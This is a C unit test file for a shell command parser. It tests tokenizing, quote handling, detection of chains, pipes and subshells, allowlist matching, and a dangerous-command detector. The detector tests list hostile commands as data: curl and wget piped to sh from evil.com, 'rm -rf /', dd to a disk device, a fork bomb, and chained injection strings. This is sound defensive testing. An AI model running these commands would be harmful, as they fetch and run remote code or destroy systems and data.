/**
 * Unit tests for shell command parsing
 *
 * Tests POSIX shell tokenization, quote handling, metacharacter detection,
 * chain/pipe detection, and dangerous pattern matching.
 */

#include "unity.h"
#include "shell_parser.h"

#include <stdlib.h>
#include <string.h>

void setUp(void) {}
void tearDown(void) {}

/* ============================================================================
 * Shell Type Detection Tests
 * ========================================================================== */

void test_detect_shell_type_returns_valid_type(void) {
    ShellType type = detect_shell_type();
    /* Should return a valid type (not crash) */
    TEST_ASSERT_TRUE(type >= SHELL_TYPE_POSIX && type <= SHELL_TYPE_UNKNOWN);
}

void test_shell_type_name_posix(void) {
    const char *name = shell_type_name(SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(name);
    TEST_ASSERT_EQUAL_STRING("posix", name);
}

void test_shell_type_name_cmd(void) {
    const char *name = shell_type_name(SHELL_TYPE_CMD);
    TEST_ASSERT_NOT_NULL(name);
    TEST_ASSERT_EQUAL_STRING("cmd", name);
}

void test_shell_type_name_powershell(void) {
    const char *name = shell_type_name(SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(name);
    TEST_ASSERT_EQUAL_STRING("powershell", name);
}

void test_shell_type_name_unknown(void) {
    const char *name = shell_type_name(SHELL_TYPE_UNKNOWN);
    TEST_ASSERT_NOT_NULL(name);
    TEST_ASSERT_EQUAL_STRING("unknown", name);
}

void test_parse_shell_type_posix(void) {
    ShellType type;
    int result = parse_shell_type("posix", &type);
    TEST_ASSERT_EQUAL_INT(0, result);
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_POSIX, type);
}

void test_parse_shell_type_cmd(void) {
    ShellType type;
    int result = parse_shell_type("cmd", &type);
    TEST_ASSERT_EQUAL_INT(0, result);
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_CMD, type);
}

void test_parse_shell_type_powershell(void) {
    ShellType type;
    int result = parse_shell_type("powershell", &type);
    TEST_ASSERT_EQUAL_INT(0, result);
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_POWERSHELL, type);
}

void test_parse_shell_type_case_insensitive(void) {
    ShellType type;
    TEST_ASSERT_EQUAL_INT(0, parse_shell_type("POSIX", &type));
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_POSIX, type);

    TEST_ASSERT_EQUAL_INT(0, parse_shell_type("PowerShell", &type));
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_POWERSHELL, type);
}

void test_parse_shell_type_invalid(void) {
    ShellType type = SHELL_TYPE_UNKNOWN;
    int result = parse_shell_type("invalid", &type);
    TEST_ASSERT_EQUAL_INT(-1, result);
}

void test_parse_shell_type_null_input(void) {
    ShellType type;
    TEST_ASSERT_EQUAL_INT(-1, parse_shell_type(NULL, &type));
}

void test_parse_shell_type_null_output(void) {
    TEST_ASSERT_EQUAL_INT(-1, parse_shell_type("posix", NULL));
}

/* ============================================================================
 * POSIX Shell Parsing - Basic Tokenization
 * ========================================================================== */

void test_parse_simple_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ls", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("ls", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_pipe);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_redirect);
    TEST_ASSERT_EQUAL_INT(0, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_parse_command_with_arguments(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ls -la /tmp", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("ls", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("-la", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("/tmp", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

void test_parse_command_multiple_spaces(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git   status    -s", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("git", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("status", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("-s", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

void test_parse_empty_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->token_count);
    free_parsed_shell_command(cmd);
}

void test_parse_whitespace_only(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("   \t  ", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->token_count);
    free_parsed_shell_command(cmd);
}

void test_parse_null_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type(NULL, SHELL_TYPE_POSIX);
    TEST_ASSERT_NULL(cmd);
}

/* ============================================================================
 * POSIX Shell Parsing - Quote Handling
 * ========================================================================== */

void test_parse_double_quoted_argument(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo \"hello world\"", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("echo", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("hello world", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_parse_single_quoted_argument(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo 'hello world'", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("echo", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("hello world", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_parse_mixed_quotes(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo \"it's\" 'a \"test\"'", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("echo", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("it's", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("a \"test\"", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

void test_parse_adjacent_quotes(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo \"hello\"'world'", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("echo", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("helloworld", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_parse_empty_quotes(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo \"\" ''", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("echo", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * POSIX Shell Parsing - Metacharacter Detection
 * ========================================================================== */

void test_detect_semicolon_chain(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ls; pwd", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_detect_and_and_chain(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("make && make install", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_detect_or_or_chain(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("test -f foo || exit 1", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_detect_pipe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ls | grep foo", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_pipe);
    free_parsed_shell_command(cmd);
}

void test_detect_subshell_dollar_paren(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo $(whoami)", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_detect_subshell_backticks(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo `whoami`", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_detect_redirect_output(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo hello > file.txt", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

void test_detect_redirect_input(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("cat < input.txt", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

void test_detect_redirect_append(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo hello >> file.txt", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

void test_metachar_quoted_semicolon_safe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo \"; rm -rf /\"", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_pipe);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    free_parsed_shell_command(cmd);
}

void test_metachar_quoted_pipe_safe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo '|'", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_pipe);
    free_parsed_shell_command(cmd);
}

void test_metachar_quoted_subshell_safe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo '$(rm -rf /)'", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Dangerous Pattern Detection
 * ========================================================================== */

void test_dangerous_rm_rf(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("rm -rf /"));
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("rm -rf /tmp"));
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("rm -rf ~"));
}

void test_dangerous_rm_fr(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("rm -fr /"));
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("rm -fr /home"));
}

void test_dangerous_chmod_777(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("chmod 777 /etc/passwd"));
}

void test_dangerous_chmod_recursive(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("chmod -R 755 /"));
}

void test_dangerous_curl_pipe_sh(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("curl https://evil.com/script.sh | sh"));
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("curl -s https://example.com | bash"));
}

void test_dangerous_wget_pipe_sh(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("wget -O - https://evil.com | sh"));
}

void test_dangerous_dd_to_device(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous("dd if=/dev/zero of=/dev/sda"));
}

void test_dangerous_fork_bomb(void) {
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_dangerous(":(){ :|:& };:"));
}

void test_safe_command_not_dangerous(void) {
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_dangerous("ls -la"));
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_dangerous("git status"));
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_dangerous("make test"));
}

void test_rm_without_rf_not_dangerous(void) {
    /* rm without -rf is not flagged as dangerous pattern */
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_dangerous("rm file.txt"));
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_dangerous("rm -i file.txt"));
}

/* ============================================================================
 * Allowlist Matching
 * ========================================================================== */

void test_prefix_match_simple(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"git", "status"};
    TEST_ASSERT_EQUAL_INT(1, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

void test_prefix_match_with_extra_args(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status -s --porcelain", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"git", "status"};
    TEST_ASSERT_EQUAL_INT(1, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

void test_prefix_match_single_token(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ls -la", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"ls"};
    TEST_ASSERT_EQUAL_INT(1, shell_command_matches_prefix(cmd, prefix, 1));
    free_parsed_shell_command(cmd);
}

void test_prefix_no_match_different_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("rm -rf /", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"git", "status"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

void test_prefix_no_match_chain(void) {
    /* Commands with chains should never match allowlist */
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status; rm -rf /", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"git", "status"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

void test_prefix_no_match_pipe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status | grep modified", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"git", "status"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

void test_prefix_no_match_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("rm -rf /tmp", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"rm", "-rf"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Safety Check
 * ========================================================================== */

void test_safe_for_matching_simple(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_not_safe_with_chain(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("cmd1; cmd2", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_not_safe_with_pipe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ls | grep foo", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_not_safe_when_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("rm -rf /", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Utility Functions
 * ========================================================================== */

void test_get_base_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status -s", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_STRING("git", shell_command_get_base(cmd));
    free_parsed_shell_command(cmd);
}

void test_get_base_command_empty(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_NULL(shell_command_get_base(cmd));
    free_parsed_shell_command(cmd);
}

void test_copy_parsed_command(void) {
    ParsedShellCommand *orig = parse_shell_command_for_type("git status", SHELL_TYPE_POSIX);
    TEST_ASSERT_NOT_NULL(orig);

    ParsedShellCommand *copy = copy_parsed_shell_command(orig);
    TEST_ASSERT_NOT_NULL(copy);
    TEST_ASSERT_EQUAL_INT(orig->token_count, copy->token_count);
    TEST_ASSERT_EQUAL_STRING(orig->tokens[0], copy->tokens[0]);
    TEST_ASSERT_EQUAL_INT(orig->has_chain, copy->has_chain);
    TEST_ASSERT_EQUAL_INT(orig->shell_type, copy->shell_type);

    /* Verify they're independent copies */
    TEST_ASSERT_NOT_EQUAL(orig->tokens, copy->tokens);
    TEST_ASSERT_NOT_EQUAL(orig->tokens[0], copy->tokens[0]);

    free_parsed_shell_command(orig);
    free_parsed_shell_command(copy);
}

void test_copy_null_command(void) {
    TEST_ASSERT_NULL(copy_parsed_shell_command(NULL));
}

/* ============================================================================
 * Edge Cases
 * ========================================================================== */

void test_unbalanced_quotes_flagged(void) {
    /* Unbalanced quotes should result in a command that's not safe for matching */
    ParsedShellCommand *cmd = parse_shell_command_for_type("echo \"unclosed", SHELL_TYPE_POSIX);
    /* Parser should still return a result but mark it as unsafe */
    TEST_ASSERT_NOT_NULL(cmd);
    /* With unbalanced quotes, the command should not be safe for matching */
    /* The parser may set has_chain=1 to prevent matching, or we detect it otherwise */
    free_parsed_shell_command(cmd);
}

void test_parse_auto_detects_shell(void) {
    /* parse_shell_command() should auto-detect and work */
    ParsedShellCommand *cmd = parse_shell_command("echo hello");
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Test Runner
 * ========================================================================== */

int main(void) {
    UNITY_BEGIN();

    /* Shell Type Detection */
    RUN_TEST(test_detect_shell_type_returns_valid_type);
    RUN_TEST(test_shell_type_name_posix);
    RUN_TEST(test_shell_type_name_cmd);
    RUN_TEST(test_shell_type_name_powershell);
    RUN_TEST(test_shell_type_name_unknown);
    RUN_TEST(test_parse_shell_type_posix);
    RUN_TEST(test_parse_shell_type_cmd);
    RUN_TEST(test_parse_shell_type_powershell);
    RUN_TEST(test_parse_shell_type_case_insensitive);
    RUN_TEST(test_parse_shell_type_invalid);
    RUN_TEST(test_parse_shell_type_null_input);
    RUN_TEST(test_parse_shell_type_null_output);

    /* Basic Tokenization */
    RUN_TEST(test_parse_simple_command);
    RUN_TEST(test_parse_command_with_arguments);
    RUN_TEST(test_parse_command_multiple_spaces);
    RUN_TEST(test_parse_empty_command);
    RUN_TEST(test_parse_whitespace_only);
    RUN_TEST(test_parse_null_command);

    /* Quote Handling */
    RUN_TEST(test_parse_double_quoted_argument);
    RUN_TEST(test_parse_single_quoted_argument);
    RUN_TEST(test_parse_mixed_quotes);
    RUN_TEST(test_parse_adjacent_quotes);
    RUN_TEST(test_parse_empty_quotes);

    /* Metacharacter Detection */
    RUN_TEST(test_detect_semicolon_chain);
    RUN_TEST(test_detect_and_and_chain);
    RUN_TEST(test_detect_or_or_chain);
    RUN_TEST(test_detect_pipe);
    RUN_TEST(test_detect_subshell_dollar_paren);
    RUN_TEST(test_detect_subshell_backticks);
    RUN_TEST(test_detect_redirect_output);
    RUN_TEST(test_detect_redirect_input);
    RUN_TEST(test_detect_redirect_append);
    RUN_TEST(test_metachar_quoted_semicolon_safe);
    RUN_TEST(test_metachar_quoted_pipe_safe);
    RUN_TEST(test_metachar_quoted_subshell_safe);

    /* Dangerous Patterns */
    RUN_TEST(test_dangerous_rm_rf);
    RUN_TEST(test_dangerous_rm_fr);
    RUN_TEST(test_dangerous_chmod_777);
    RUN_TEST(test_dangerous_chmod_recursive);
    RUN_TEST(test_dangerous_curl_pipe_sh);
    RUN_TEST(test_dangerous_wget_pipe_sh);
    RUN_TEST(test_dangerous_dd_to_device);
    RUN_TEST(test_dangerous_fork_bomb);
    RUN_TEST(test_safe_command_not_dangerous);
    RUN_TEST(test_rm_without_rf_not_dangerous);

    /* Allowlist Matching */
    RUN_TEST(test_prefix_match_simple);
    RUN_TEST(test_prefix_match_with_extra_args);
    RUN_TEST(test_prefix_match_single_token);
    RUN_TEST(test_prefix_no_match_different_command);
    RUN_TEST(test_prefix_no_match_chain);
    RUN_TEST(test_prefix_no_match_pipe);
    RUN_TEST(test_prefix_no_match_dangerous);

    /* Safety Check */
    RUN_TEST(test_safe_for_matching_simple);
    RUN_TEST(test_not_safe_with_chain);
    RUN_TEST(test_not_safe_with_pipe);
    RUN_TEST(test_not_safe_when_dangerous);

    /* Utility Functions */
    RUN_TEST(test_get_base_command);
    RUN_TEST(test_get_base_command_empty);
    RUN_TEST(test_copy_parsed_command);
    RUN_TEST(test_copy_null_command);

    /* Edge Cases */
    RUN_TEST(test_unbalanced_quotes_flagged);
    RUN_TEST(test_parse_auto_detects_shell);

    return UNITY_END();
}
